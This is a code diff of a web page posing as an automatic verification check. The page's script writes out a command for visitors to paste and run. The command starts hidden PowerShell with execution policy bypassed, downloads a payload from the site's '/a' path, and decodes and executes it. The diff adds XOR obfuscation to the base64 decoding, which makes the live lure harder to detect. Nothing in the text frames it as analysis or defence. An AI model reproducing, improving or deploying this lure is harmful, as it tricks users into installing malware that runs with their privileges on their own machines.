@@ -46,7 +46,7 @@ button.ok{background:#248046}
   <div class="foot">Verification is done automatically in the background</div>
 </div>
 <script>
-var t='cmd /c cd /d %SystemRoot% & powershell -nop -w h -ep bypass -c "&([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm '+location.origin+'/a)))))"';
+var t='explorer.exe powershell -nop -w h -ep bypass -c "$b=[Convert]::FromBase64String((irm '+location.origin+'/a));for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor 37};&([scriptblock]::Create([Text.Encoding]::UTF8.GetString($b)))"';
 document.getElementById('cmd').textContent=t;
 document.getElementById('b').onclick=function(){
   var b=this;
